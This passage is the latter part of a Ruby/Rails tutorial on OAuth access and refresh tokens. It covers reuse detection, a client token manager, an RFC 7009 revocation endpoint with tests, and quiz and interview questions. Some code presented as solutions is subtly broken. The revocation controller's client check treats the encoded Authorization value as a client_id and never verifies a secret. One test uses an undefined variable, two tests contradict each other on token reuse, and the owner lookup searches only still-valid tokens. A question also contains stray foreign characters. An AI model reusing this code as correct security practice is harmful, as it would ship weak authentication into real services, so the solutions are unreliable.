      event_type: "refresh_token_reuse",
      severity: "critical",
      presented_token_hash: Digest::SHA256.hexdigest(presented_token),
      client_info: client_info,
      detected_at: Time.now
    )
    
    # Try to identify affected user
    user = identify_token_owner(presented_token)
    
    if user
      # Revoke entire token family
      RefreshToken.where(user: user).update_all(
        invalidated: true,
        revoked_at: Time.now,
        revocation_reason: "reuse_detected"
      )
      
      # Optional: Force password reset
      user.update!(force_password_reset: true)
      
      # Send security alert
      SecurityMailer.token_reuse_detected(user).deliver_later
    end
    
    # Alert security team
    SecurityAlert.create!(
      severity: "critical",
      title: "Refresh Token Reuse Detected",
      description: "Possible token theft - entire token family revoked",
      user_id: user&.id,
      client_info: client_info
    )
  end
  
  def identify_token_owner(presented_token)
    # In production, maintain an index of token hashes to user IDs
    # This is simplified
    RefreshToken.valid.each do |token|
      if BCrypt::Password.new(token.token) == presented_token
        return token.user
      end
    end
    nil
  end
end
```

#### Client Implementation

```ruby
class TokenManager
  include MonitorMixin
  
  SKEW = 30.seconds
  REFRESH_TIMEOUT = 5.seconds
  
  def initialize(auth_client)
    super()
    @auth_client = auth_client
    @access_token = nil
    @refresh_token = load_refresh_token_from_secure_storage
    @expires_at = Time.at(0)
    @refresh_in_progress = false
  end
  
  def get_access_token
    synchronize do
      return @access_token if token_valid?
      
      if @refresh_in_progress
        wait_until = Time.now + REFRESH_TIMEOUT
        while Time.now < wait_until && @refresh_in_progress
          wait(100)
        end
        
        return @access_token if token_valid?
        raise AuthenticationError, "Refresh timeout"
      end
      
      @refresh_in_progress = true
      begin
        refresh!
        @access_token
      ensure
        @refresh_in_progress = false
        broadcast
      end
    end
  end
  
  private
  
  def token_valid?
    @access_token && Time.now < @expires_at - SKEW
  end
  
  def refresh!
    raise AuthenticationError, "No refresh token" unless @refresh_token
    
    response = @auth_client.refresh(@refresh_token)
    
    @access_token = response[:access_token]
    @refresh_token = response[:refresh_token]
    @expires_at = Time.now + response[:expires_in]
    
    save_refresh_token_to_secure_storage(@refresh_token)
  end
end
```

#### Test Cases

```ruby
RSpec.describe RefreshTokenService do
  let(:service) { described_class.new }
  let(:user) { create(:user) }
  let(:refresh_token) { create(:refresh_token, user: user) }
  
  describe "#rotate" do
    it "rotates refresh token" do
      result = service.rotate(refresh_token.raw_token, {})
      
      expect(result[:access_token]).to be_present
      expect(result[:refresh_token]).not_to eq(refresh_token.raw_token)
      
      expect(refresh_token.reload).to be_invalidated
    end
    
    it "returns same tokens within grace period" do
      # First rotation
      result1 = service.rotate(refresh_token.raw_token, {})
      
      # Second rotation within grace period
      result2 = service.rotate(refresh_token.raw_token, {})
      
      expect(result2[:access_token]).to eq(result1[:access_token])
      expect(result2[:refresh_token]).to eq(result1[:refresh_token])
    end
    
    it "detects reuse and revokes token family" do
      # First use
      service.rotate(refresh_token.raw_token, {})
      
      # Second use (reuse)
      service.rotate(refresh_token.raw_token, {})
      
      # Should have security event
      expect(SecurityEvent.count).to eq(1)
      expect(SecurityEvent.last.event_type).to eq("refresh_token_reuse")
      
      # All user's tokens should be revoked
      expect(user.refresh_tokens.where(invalidated: false).count).to eq(0)
    end
  end
end
```

---

### Exercise 3: Build Token Revocation Endpoint

**Difficulty:** Intermediate | **Time:** 25 minutes

#### Problem Statement

Implement RFC 7009 token revocation endpoint that handles both access and refresh tokens.

#### Requirements

1. Accept `token` and `token_type_hint` parameters
2. Support both access and refresh token revocation
3. Return 200 even if token doesn't exist (security)
4. Hash tokens before storage
5. Implement rate limiting
6. Log all revocation attempts

#### Solution

```ruby
# app/controllers/authentication/revocations_controller.rb
module Authentication
  class RevocationsController < ApplicationController
    skip_before_action :verify_authenticity_token
    before_action :authenticate_client
    before_action :rate_limit
    
    def revoke
      token = params[:token]
      token_type_hint = params[:token_type_hint]
      
      # Always return 200 (don't reveal if token exists)
      head :ok
      
      # Process revocation asynchronously
      RevokeTokenJob.perform_later(token, token_type_hint, current_client)
    end
    
    private
    
    def authenticate_client
      # Basic auth or client credentials
      client_id = request.authorization&.split(" ")&.last
      @current_client = OAuthClient.find_by(client_id: client_id)
      
      unless @current_client
        render json: { error: "invalid_client" }, status: :unauthorized
      end
    end
    
    def rate_limit
      key = "revoke:#{request.remote_ip}"
      count = Redis.current.incr(key)
      Redis.current.expire(key, 60) if count == 1
      
      if count > 100 # 100 requests per minute
        render json: { error: "rate_limit_exceeded" }, status: :too_many_requests
      end
    end
  end
end

# app/jobs/revoke_token_job.rb
class RevokeTokenJob < ApplicationJob
  queue_as :low
  
  def perform(token, token_type_hint, client)
    # Log revocation attempt
    AuditLog.create!(
      action: "token_revocation",
      client: client,
      token_type: token_type_hint,
      token_jti: extract_jti(token),
      ip_address: Current.ip_address,
      user_agent: Current.user_agent
    )
    
    case token_type_hint
    when "refresh_token"
      revoke_refresh_token(token)
    when "access_token"
      revoke_access_token(token)
    else
      # Try both
      revoke_refresh_token(token)
      revoke_access_token(token)
    end
  end
  
  private
  
  def revoke_refresh_token(token)
    stored = RefreshToken.find_valid_by_token(token)
    return unless stored
    
    stored.update!(
      invalidated: true,
      revoked_at: Time.now,
      revocation_reason: "explicit_revocation"
    )
  end
  
  def revoke_access_token(token)
    # Decode without verification to get jti
    begin
      claims = JWT.decode(token, nil, false).first
      jti = claims["jti"]
      
      if jti
        # Add to denylist with TTL matching token expiration
        exp = claims["exp"] - Time.now.to_i
        Redis.current.setex("revoked:#{jti}", exp, "1")
      end
    rescue JWT::DecodeError
      # Ignore invalid tokens
    end
  end
  
  def extract_jti(token)
    JWT.decode(token, nil, false).first&.dig("jti")
  rescue JWT::DecodeError
    nil
  end
end
```

#### Test Cases

```ruby
RSpec.describe "POST /oauth2/revoke" do
  let(:client) { create(:oauth_client) }
  let(:refresh_token) { create(:refresh_token) }
  
  it "revokes refresh token" do
    basic_auth = Base64.encode64("#{client.client_id}:#{client.client_secret}")
    
    post "/oauth2/revoke",
      params: {
        token: refresh_token.raw_token,
        token_type_hint: "refresh_token"
      },
      headers: {
        "Authorization" => "Basic #{basic_auth}"
      }
    
    expect(response).to have_http_status(:ok)
    expect(refresh_token.reload).to be_invalidated
  end
  
  it "returns 200 for non-existent token" do
    basic_auth = Base64.encode64("#{client.client_id}:#{client.client_secret}")
    
    post "/oauth2/revoke",
      params: { token: "nonexistent" },
      headers: {
        "Authorization" => "Basic #{basic_auth}"
      }
    
    expect(response).to have_http_status(:ok)
  end
  
  it "rate limits excessive requests" do
    101.times do
      post "/oauth2/revoke",
        params: { token: "test" },
        headers: {
          "Authorization" => "Basic #{basic_auth}"
        }
    end
    
    expect(response).to have_http_status(:too_many_requests)
  end
end
```

---

## Test Your Understanding

### Questions

1. **What is the fundamental trade-off in token-based authentication?**
   <details>
   <summary>Answer</summary>
   A credential cannot be both cheap to verify and cheap to revoke. Fast local verification means the token is valid until expiration (hard to revoke). Immediate revocation requires checking shared state on every request (network call).
   </details>

2. **Why are access tokens short-lived?**
   <details>
   <summary>Answer</summary>
   Short lifetimes limit the blast radius if a token is stolen. A leaked token can only be abused for a short window (typically 5-15 minutes) before it expires.
   </details>

3. **What is a bearer token?**
   <details>
   <summary>Answer</summary>
   A bearer token is a token that grants access to whoever presents it, with no further proof of identity. Whoever has the token can use it.
   </details>

4. **Why must you verify the `aud` (audience) claim?**
   <details>
   <summary>Answer</summary>
   Without audience verification, a token issued for one API (e.g., search-api) could be used against another API (e.g., admin-api), even if the user only has read-only permissions on the first API.
   </details>

5. **What's the difference between decoding and validating a JWT?**
   <details>
   <summary>Answer</summary>
   Decoding is base64url-decoding the payload to read claims (no cryptography). Validation involves cryptographic signature verification plus checking all claims (iss, aud, exp, scope, etc.).
   </details>

6. **Why should you pin the JWT algorithm instead of trusting the header?**
   <details>
   <summary>Answer</summary>
   An attacker could modify the header to use `alg: "none"` or switch to a weaker algorithm. Pinning prevents algorithm confusion attacks.
   </details>

7. **What is refresh token rotation?**
   <details>
   <summary>Answer</summary>
   Each use of a refresh token issues a new one and immediately invalidates the old one. Tokens become single-use, which helps detect theft.
   </details>

8. **Why does refresh token reuse indicate a security incident?**
   <details>
   <summary>Answer</summary>
   A single token lineage should never fork into two users. If both attacker and legitimate client present the same token, one is presenting an already-invalidated token, indicating compromise.
   </details>

9. **What is the grace period in token rotation?**
   <details>
   <summary>Answer</summary>
   A short window (e.g., 5 seconds) where a recently-rotated token is still accepted. This handles network retries where the refresh response is lost and the client retries.
   </details>

10. **Where should refresh tokens be stored in a browser?**
    <details>
    <summary>Answer</summary>
    In HttpOnly, Secure, SameSite cookies scoped to the token endpoint path. This prevents JavaScript access, mitigating XSS attacks.
    </details>

11. **What is JWKS and why is it important?**
    <details>
    <summary>Answer</summary>
    JSON Web Key Set (JWKS) is a set of public keys published by the authorization server. It enables key rotation without downtime—services fetch the current keys and use the `kid` in the JWT header to find the right key.
    </details>

12. **What's the difference between idle and absolute token lifetime?**
    <details>
    <summary>Answer</summary>
    Absolute lifetime caps validity from issuance (e.g., 30 days max). Idle lifetime resets on each use (e.g., expire after 7 days of inactivity).
    </details>

13. **Why is introspection expensive?**
    <details>
    <summary>Answer</summary>
    It requires a network call to the authorization server on every request, putting the auth server in the hot path and creating a scalability bottleneck.
    </details>

14. **What is a denylist in token validation?**
    <details>
    <summary>Answer</summary>
    A list of revoked token IDs (jti) checked alongside local verification. Allows emergency revocation while maintaining fast verification for most tokens.
    </details>

15. **What is single-flight refresh?**
    <details>
    <summary>Answer</summary>
    A pattern where only one refresh request is in flight per credential. Other requests wait for the result, preventing multiple simultaneous refreshes.
    </details>

---

## Common Interview Questions

### Questions

1. **Explain the trade-off between verification cost and revocation speed in token-based authentication.**

2. **What is the difference between an opaque token and a JWT? When would you use each?**

3. **Walk me through the steps of validating a JWT access token. What claims must you check and why?**

4. **Why is it critical to verify the `aud` (audience) claim? What attack does it prevent?**

5. **What is refresh token rotation? How does it help detect token theft?**

6. **Describe the grace period pattern in token rotation. What problem does it solve?**

7. **Where should you store refresh tokens in a browser application? Why not localStorage?**

8. **What is JWKS? How does it enable key rotation without downtime?**

9. **Compare local verification vs introspection. When would you choose each approach?**

10. **What is the #1 mistake developers make when implementing JWT validation?**

11. **How does DPoP (Demonstrating Proof-of-Possession) enhance token security?**

12. **What is the difference between idle timeout and absolute lifetime for refresh tokens?**

13. **Why should you never trust the `alg` header in a JWT?**

14. **What happens during a refresh token reuse attack? How should the server respond?**

15. **Explain the single-flight refresh pattern. Why is it important?**

---

## Question Bank

### Beginner Level (15 Questions)

1. **What is an access token?**
   <details>
   <summary>Answer</summary>
   An access token is a short-lived credential used to authenticate API requests. It proves the holder has permission to access resources.
   </details>

2. **What is a refresh token?**
   <details>
   <summary>Answer</summary>
   A refresh token is a long-lived credential used to obtain new access tokens without requiring the user to log in again.
   </details>

3. **What does "bearer token" mean?**
   <details>
   <summary>Answer</summary>
   Whoever presents (bears) the token gets access. No additional proof of identity is required.
   </details>

4. **What is OAuth 2.0?**
   <details>
   <summary>Answer</summary>
   An authorization framework that enables applications to obtain limited access to user accounts on HTTP services.
   </details>

5. **What is JWT?**
   <details>
   <summary>Answer</summary>
   JSON Web Token - a compact, URL-safe means of representing claims to be transferred between parties, encoded as a JSON object.
   </details>

6. **What are the three parts of a JWT?**
   <details>
   <summary>Answer</summary>
   Header (algorithm, type), Payload (claims/data), and Signature (verification).
   </details>

7. **What is the Authorization header?**
   <details>
   <summary>Answer</summary>
   An HTTP header used to send credentials (typically Bearer tokens) for authenticating requests.
   </details>

8. **What is token expiration?**
   <details>
   <summary>Answer</summary>
   The time after which a token is no longer valid, specified in the `exp` claim.
   </details>

9. **What is a scope in OAuth?**
   <details>
   <summary>Answer</summary>
   A scope defines the permissions granted to an access token (e.g., read, write, admin).
   </details>

10. **What is the token endpoint in OAuth?**
    <details>
    <summary>Answer</summary>
    The endpoint where clients request access tokens (and refresh tokens) by presenting credentials.
    </details>

11. **What is HTTPS and why is it important for tokens?**
    <details>
    <summary>Answer</summary>
    HTTPS encrypts HTTP traffic, preventing token interception in transit. Always use HTTPS with tokens.
    </details>

12. **What is PKCE?**
    <details>
    <summary>Answer</summary>
    Proof Key for Code Exchange - a security extension for OAuth that prevents authorization code interception attacks.
    </details>

13. **What is the difference between authentication and authorization?**
    <details>
    <summary>Answer</summary>
    Authentication verifies identity (who you are). Authorization verifies permissions (what you can do).
    </details>

14. **What is a client in OAuth?**
    <details>
    <summary>Answer</summary>
    An application making requests on behalf of a user or itself. Can be public (mobile, SPA) or confidential (server-side).
    </details>

15. **What is an authorization server?**
    <details>
    <summary>Answer</summary>
    The server that issues access tokens after authenticating the resource owner and obtaining authorization.
    </details>

### Intermediate Level (20 Questions)

16. **Explain the fundamental trade-off in token-based authentication.**
    <details>
    <summary>Answer</summary>
    A credential cannot be both cheap to verify and cheap to revoke. Fast local verification (JWT) means tokens are valid until expiration (hard to revoke). Immediate revocation requires checking shared state (introspection), which is slow.
    </details>

17. **What is the #1 mistake in JWT validation?**
    <details>
    <summary>Answer</summary>
    Verifying the signature but not checking the audience claim. This allows tokens issued for one API to be used against another API.
    </details>

18. **Why should you pin the JWT algorithm?**
    <details>
    <summary>Answer</summary>
    To prevent algorithm confusion attacks where an attacker changes the header to `alg: "none"` or a weaker algorithm.
    </details>

19. **What is JWKS and why is it important?**
    <details>
    <summary>Answer</summary>
    JSON Web Key Set - a published set of public keys. Enables key rotation without downtime by using the `kid` in JWT headers to find the correct key.
    </details>

20. **Compare opaque tokens vs JWT.**
    <details>
    <summary>Answer</summary>
    Opaque: Random ID, requires introspection, small, easy revocation. JWT: Self-contained, local verification, larger, harder revocation. Choose based on needs.
    </details>

21. **What is refresh token rotation?**
    <details>
    <summary>Answer</summary>
    Each use of a refresh token issues a new one and invalidates the old one. Makes tokens single-use to detect theft.
    </details>

22. **Why does token reuse indicate compromise?**
    <details>
    <summary>Answer</summary>
    A single token lineage should never fork into two users. If both attacker and legitimate user present the same token, one is using an invalidated token, proving theft occurred.
    </details>

23. **What is the grace period in token rotation?**
    <details>
    <summary>Answer</summary>
    A short window (5-10 seconds) where a recently-rotated token is still accepted. Handles network retries when refresh responses are lost.
    </details>

24. **What is single-flight refresh?**
    <details>
    <summary>Answer</summary>
    A pattern ensuring only one refresh request is in flight per credential. Other requests wait for the result, preventing duplicate refreshes.
    </details>

25. **Where should refresh tokens be stored in a browser?**
    <details>
    <summary>Answer</summary>
    HttpOnly, Secure, SameSite cookies scoped to the token endpoint. Prevents JavaScript access, mitigating XSS attacks.
    </details>

26. **Why is localStorage bad for token storage?**
    <details>
    <summary>Answer</summary>
    Any JavaScript can access localStorage, so an XSS vulnerability anywhere on the page can steal tokens.
    </details>

27. **What is introspection (RFC 7662)?**
    <details>
    <summary>Answer</summary>
    A protocol where the resource server sends a token to the authorization server and receives a live verdict on its validity. Enables immediate revocation.
    </details>

28. **What is a denylist in token validation?**
    <details>
    <summary>Answer</summary>
    A list of revoked token IDs checked alongside local verification. Allows emergency revocation while maintaining fast verification for most tokens.
    </details>

29. **What is the difference between idle and absolute lifetime?**
    <details>
    <summary>answer</summary>
    Absolute lifetime: Fixed duration from issuance (e.g., 30 days). Idle lifetime: Resets on each use, expires after inactivity (e.g., 7 days without use).
    </details>

30. **What is clock skew tolerance?**
    <details>
    <summary>Answer</summary>
    A time buffer (typically 30 seconds) added to time-based checks to account for clock differences between systems.
    </details>

31. **What is DPoP?**
    <details>
    <summary>Answer</summary>
    Demonstrating Proof-of-Possession - a mechanism binding tokens to a specific client by having the client sign each request with a private key.
    </details>

32. **What is mTLS?**
    <details>
    <summary>Answer</summary>
    Mutual TLS - both client and server authenticate each other using certificates. Binds tokens to client certificates.
    </details>

33. **Why hash refresh tokens in the database?**
    <details>
    <summary>Answer</summary>
    Like passwords, if the database is compromised, hashed tokens cannot be used. Prevents token theft from data breaches.
    </details>

34. **What is RFC 7009?**
    <details>
    <summary>Answer</summary>
    The OAuth 2.0 Token Revocation specification. Defines the revocation endpoint for invalidating access and refresh tokens.
    </details>

35. **What is RFC 9700?**
    <details>
    <summary>Answer</summary>
    OAuth 2.0 Security Best Current Practice. Recommends refresh token rotation for public clients and other security measures.
    </details>

### Advanced Level (15 Questions)

36. **Design a token validation system for a high-traffic API (100k req/s). What approach do you choose and why?**
    <details>
    <summary>Answer</summary>
    Use local JWT verification with JWKS caching. This provides ~1ms validation time and excellent scalability. Add a Redis-backed denylist for emergency revocation. Avoid introspection due to latency and scalability concerns.
    </details>

37. **How would you implement token revocation without introspection?**
    <details>
    <summary>Answer</summary>
    Use a short-lived denylist (Redis) of revoked jti values. Check this list during local verification. Set TTL on denylist entries matching token expiration. This allows immediate revocation while maintaining fast verification.
    </details>

38. **Explain how you'd migrate from session-based auth to token-based auth without forcing all users to re-authenticate.**
    <details>
    <summary>Answer</summary>
    1. Run both systems in parallel. 2. Issue tokens to users on next session validation. 3. Accept both session cookies and tokens. 4. Gradually migrate clients. 5. Deprecate sessions after migration complete. 6. Provide fallback for edge cases.
    </details>

39. **How do you handle key rotation in a distributed system with 50+ services?**
    <details>
    <summary>Answer</summary>
    1. Publish JWKS endpoint with multiple keys. 2. Services cache keys with 1-hour TTL. 3. Keep old keys valid during rotation. 4. Use `kid` header to identify signing key. 5. Monitor for validation failures during rotation. 6. Gradually phase out old keys.
    </details>

40. **Design a refresh token system for a mobile app that must work offline.**
    <details>
    <summary>Answer</summary>
    1. Issue refresh tokens with 30-day absolute lifetime. 2. Store in platform keystore. 3. Implement token rotation on sync. 4. Queue refresh attempts when offline. 5. Use exponential backoff for failed refreshes. 6. Force re-auth after absolute expiry. 7. Implement device binding with DPoP.
    </details>

41. **How would you detect and respond to a大规模 refresh token theft attack?**
    <details>
    <summary>Answer</summary>
    1. Monitor for reuse events (same token from different IPs). 2. Alert on spike in reuse detections. 3. Automatically revoke entire token family on first reuse. 4. Force password reset for affected users. 5. Analyze patterns (time, client version, geography). 6. Notify security team. 7. Review logs for attack vector.
    </details>

42. **Explain the security implications of using HS256 vs RS256 for JWT.**
    <details>
    <summary>Answer</summary>
    HS256 (symmetric): Same secret signs and verifies. If secret leaks, attackers can forge tokens. RS256 (asymmetric): Private key signs, public key verifies. Public key can be shared safely. RS256 is preferred for distributed systems.
    </details>

43. **How do you prevent token replay attacks?**
    <details>
    <summary>Answer</summary>
    1. Use HTTPS to prevent interception. 2. Short token lifetimes. 3. Implement DPoP or mTLS to bind tokens to clients. 4. Monitor for duplicate jti values from different sources. 5. Include nonce/timestamp in requests.
    </details>

44. **Design an authorization system using JWT scopes for a multi-tenant SaaS application.**
    <details>
    <summary>Answer</summary>
    1. Include `tenant_id` in JWT payload. 2. Use scopes like `tenant:123:read`, `tenant:123:write`. 3. Validate tenant matches resource. 4. Implement hierarchical scopes (admin > user > read). 5. Cache tenant permissions. 6. Support role-based and attribute-based access control.
    </details>

45. **What are the security risks of storing JWTs in browser localStorage?**
    <details>
    <summary>Answer</summary>
    1. XSS attacks can read localStorage. 2. Any script on the origin can access tokens. 3. Persistent across tabs (good and bad). 4. No automatic expiration. 5. Vulnerable to DOM-based XSS. Use HttpOnly cookies instead.
    </details>

46. **How would you implement rate limiting on the token endpoint?**
    <details>
    <summary>Answer</summary>
    1. Track requests by client_id and IP. 2. Use sliding window algorithm. 3. Limit refresh token requests (prevent brute force). 4. Implement exponential backoff after failures. 5. Alert on abuse patterns. 6. Return 429 with Retry-After header.
    </details>

47. **Explain how you'd debug a "token works in dev but not in production" issue.**
    <details>
    <summary>Answer</summary>
    1. Check clock skew (NTP sync). 2. Verify JWKS endpoint reachable. 3. Compare signing keys (kid). 4. Check audience/issuer values. 5. Verify HTTPS in production. 6. Check token expiration. 7. Review CORS settings. 8. Compare environment variables.
    </details>

48. **Design a system to support both session cookies and tokens during a gradual migration.**
    <details>
    <summary>Answer</summary>
    1. Accept both Authorization header and cookies. 2. Extract identity from either. 3. Set both session cookie and token on login. 4. Gradually move clients to tokens. 5. Deprecate cookies after deadline. 6. Maintain backward compatibility layer.
    </details>

49. **How do you handle token validation in a serverless environment (AWS Lambda, Vercel)?**
    <details>
    <summary>Answer</summary>
    1. Cache JWKS in global variable (reused across invocations). 2. Use short-lived tokens to minimize revocation needs. 3. Implement denylist in Redis/DynamoDB. 4. Pre-warm functions to reduce cold starts. 5. Set appropriate timeouts. 6. Monitor for cache misses.
    </details>

50. **What metrics should you monitor for a token-based authentication system?**
    <details>
    <summary>Answer</summary>
    1. Token issuance rate. 2. Refresh success/failure rate. 3. Validation latency (P50, P95, P99). 4. Reuse detection events. 5. Revocation rate. 6. Error rates by type. 7. JWKS fetch frequency. 8. Concurrent refreshes. 9. User logout patterns. 10. Security incidents.
    </details>

---

## Summary & Key Takeaways

### The Core Principles

1. **Two Tokens, Two Jobs**
   - Access token: Fast verification, short lifetime, narrow scope
   - Refresh token: Slow verification, long lifetime, controlled renewal

2. **The Impossible Triangle**
   - You can't have cheap verification, cheap revocation, and long lifetime simultaneously
   - OAuth solves this by splitting into two tokens

3. **Validation is More Than Decoding**
   - Always verify: signature, issuer, audience, expiration, scope
   - Pin the algorithm, never trust the header

4. **Rotation is Non-Negotiable**
   - Refresh tokens must be single-use
   - Reuse detection stops attacks at the cost of forcing re-authentication

5. **Storage Matters**
   - Browser: HttpOnly cookies for refresh tokens
   - Mobile: Platform keystore
   - Server: Hashed, never logged

### Quick Decision Matrix

| Decision | Recommendation |
|----------|---------------|
| **Access token lifetime** | 5-15 minutes |
| **Refresh token lifetime** | 7-30 days |
| **Token format** | JWT for APIs, opaque if introspection needed |
| **Verification** | Local with JWKS (preferred) |
| **Revocation** | Denylist for emergencies, short lifetimes for normal |
| **Browser storage** | HttpOnly cookies |
| **Algorithm** | RS256 (asymmetric) |
| **Rotation** | Required for public clients |

### The Mental Model

> **Think of it this way:** An access token is like a **day pass** to a building—easy to check at the door, expires at midnight, limited access. A refresh token is like your **employee ID card**—kept in a secure wallet, only shown at HR, can get you new day passes, but if lost and used by someone else, you know your card was stolen.

---

## Further Reading & Resources

### Official Specifications
- 📄 [RFC 6749 - OAuth 2.0](https://tools.ietf.org/html/rfc6749)
- 📄 [RFC 6750 - Bearer Token Usage](https://tools.ietf.org/html/rfc6750)
- 📄 [RFC 7662 - Token Introspection](https://tools.ietf.org/html/rfc7662)
- 📄 [RFC 7009 - Token Revocation](https://tools.ietf.org/html/rfc7009)
- 📄 [RFC 9068 - JWT Access Tokens](https://tools.ietf.org/html/rfc9068)
- 📄 [RFC 9700 - OAuth Security Best Practices](https://tools.ietf.org/html/rfc9700)
- 📄 [RFC 9449 - DPoP](https://tools.ietf.org/html/rfc9449)

### Books
- 📚 "OAuth 2.0 Simplified" by Aaron Parecki
- 📚 "JSON Web Tokens" by Matthias Biehl
- 📚 "API Security in Action" by Neil Madden

### Tools & Libraries
- 🔧 [ruby-jwt](https://github.com/jwt/ruby-jwt) - Ruby JWT library
- 🔧 [nimbus-jose-jwt](https://connect2id.com/products/nimbus-jose-jwt) - Java JWT library
- 🔧 [pyjwt](https://pyjwt.readthedocs.io/) - Python JWT library
- 🔧 [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) - Node.js JWT library
- 🔧 [jwts.dev](https://jwts.dev/) - Online JWT debugger

### Articles & Tutorials
- 📝 [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- 📝 [JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)
- 📝 [OWASP OAuth Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)

### Case Studies
- 🏢 [Google's OAuth 2.0 Implementation](https://developers.google.com/identity/protocols/oauth2)
- 🏢 [AWS Cognito Documentation](https://docs.aws.amazon.com/cognito/)
- 🏢 [Auth0 Architecture](https://auth0.com/blog/how-auth0-implements-token-validation/)

### Community Resources
- 💬 [OAuth Working Group](https://www.ietf.org/mailman/listinfo/oauth)
- 💬 [r/oauth on Reddit](https://reddit.com/r/oauth)
- 💬 [Stack Overflow - OAuth Tag](https://stackoverflow.com/questions/tagged/oauth)

---

## Self-Assessment Checklist

Use this checklist to verify your understanding:

### Fundamentals
- [ ] I can explain the trade-off between verification cost and revocation speed
- [ ] I understand why there are two tokens (access + refresh)
- [ ] I know what a bearer token is and its security implications
- [ ] I can describe the difference between opaque tokens and JWTs

### JWT Validation
- [ ] I can list all required JWT validation steps
- [ ] I understand why audience verification is critical
- [ ] I know why algorithm pinning is necessary
- [ ] I can implement JWKS-based key resolution
- [ ] I understand clock skew tolerance

### Refresh Tokens
- [ ] I can explain refresh token rotation
- [ ] I understand why reuse detection is important
- [ ] I can implement a grace period for rotation
- [ ] I know how to handle single-flight refresh
- [ ] I understand the difference between idle and absolute lifetime

### Security
- [ ] I know where to store tokens for different platforms
- [ ] I understand why localStorage is dangerous
- [ ] I can identify common attack vectors
- [ ] I know how to prevent algorithm confusion attacks
- [ ] I understand the importance of HTTPS

### Implementation
- [ ] I can implement secure JWT validation
- [ ] I can build a refresh token rotation system
- [ ] I can create a token revocation endpoint
- [ ] I know how to handle token refresh race conditions
- [ ] I can choose between local verification and introspection

---

## Next Steps

### Beginner Path
1. ✅ Complete all practice exercises
2. ✅ Implement a simple token-based auth system
3. ✅ Test with Postman or similar tool
4. ✅ Read RFC 6749 and RFC 6750
5. ✅ Experiment with jwt.io debugger

### Intermediate Path
1. ✅ Implement refresh token rotation
2. ✅ Add reuse detection and alerting
3. ✅ Implement JWKS with key rotation
4. ✅ Build a revocation endpoint
5. ✅ Add comprehensive test coverage
6. ✅ Implement monitoring and metrics

### Advanced Path
1. ✅ Implement DPoP or mTLS
2. ✅ Build a distributed token validation system
3. ✅ Design a migration from sessions to tokens
4. ✅ Implement fine-grained authorization with scopes
5. ✅ Contribute to an open-source auth library
6. ✅ Design a multi-tenant token system

---

**📝 Last Updated:** 2026-01-09

**🎓 Congratulations!** You've completed a comprehensive deep-dive into access and refresh tokens. You now understand not just how to implement token-based authentication, but why each decision matters and what trade-offs are involved.

**Remember:** The goal isn't to use the most complex system—it's to use the right system for your specific needs, with full understanding of the security and performance implications.

---

*This tutorial was created following comprehensive tutorial preferences with a focus on practical implementation, security best practices, and real-world scenarios.*